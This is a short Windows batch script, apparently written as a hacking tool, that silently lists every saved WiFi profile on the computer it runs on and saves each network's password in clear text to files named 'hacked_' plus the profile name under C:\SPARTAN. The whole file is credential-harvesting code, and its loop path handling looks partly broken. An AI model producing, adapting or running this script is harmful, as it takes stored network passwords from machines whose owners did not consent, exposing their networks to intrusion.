::RUN ALL THE COMMANDS RESULTS UNDERGROUND
@echo off
::GET ALL WIFI PROFILES SAVED IN THE PC WHICH THIS BATCH_SCRIPT IS RUNNED AND CREATE A .TXT FILE
::IN THE DIRECTORY "C:\SPARTAN\US_Profile_Lists.txt"
netsh wlan show profile | findstr /C:: > C:\SPARTAN\US_Profile_Lists.txt
::READ EACH PROFILE NAME AND GET THE PASSWORD OF EVERTY PROFILE INT A .TXT FILE WITH HIS RESPECTIVE
::PASSWORD
FOR /F "tokens=4 delims=: " %%x IN (US_Profile_Lists.txt) DO netsh wlan show profile name="%%x" key=clear > C:\SPARTAN\hacked_%%x.txt
::OPTIONAL, PRINT WHEN THE SCRIPT ENDS 
echo "The program has been completed successfully"
